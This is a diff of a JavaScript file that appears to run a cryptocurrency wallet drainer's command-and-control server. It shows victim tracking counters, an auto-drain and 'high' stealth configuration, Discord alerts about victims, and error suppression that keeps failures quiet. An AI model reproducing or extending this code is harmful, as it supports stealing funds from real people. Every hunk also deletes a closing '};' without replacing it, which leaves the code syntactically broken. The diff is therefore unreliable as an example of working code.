@@ -5,7 +5,7 @@ console.error = (...args) => {
   const msg = args[0]?.toString() || '';
   if (msg.includes('JsonRpcProvider') || msg.includes('ECONNREFUSED')) return;
   originalError.apply(console, args);
-};
+
 process.on('unhandledRejection', (reason) => {
   const reasonStr = reason?.toString() || '';
   if (reasonStr.includes('JsonRpcProvider') || reasonStr.includes('ECONNREFUSED')) return;
@@ -27,7 +27,7 @@ console.error = (...args) => {
     return; // Silent fail for ALL RPC errors
   }
   originalConsoleError.apply(console, args);
-};
+
 
 // Also suppress unhandled promise rejections
 const originalConsoleWarn = console.warn;
@@ -72,7 +72,7 @@ async function sendDiscordAlert(victimData) {
     console.log('❌ Discord alert failed:', error.message);
   }
 }
-};
+
 
 // Global unhandled rejection handler
 process.on('unhandledRejection', (reason, promise) => {
@@ -219,7 +219,7 @@ const ipWhitelist = (req, res, next) => {
     });
   }
   next();
-};
+
 
 // Apply security middleware
 app.use(generalLimiter);
@@ -258,7 +258,7 @@ let c2Config = {
   autoDrain: true,
   stealthLevel: "high",
   lastUpdated: new Date().toISOString()
-};
+
 
 let c2Stats = {
   totalVictims: 0,
@@ -266,7 +266,7 @@ let c2Stats = {
   successfulDrains: 0,
   failedDrains: 0,
   lastActivity: new Date().toISOString()
-};
+
 
 const SUPPORTED_CHAINS = {};
 
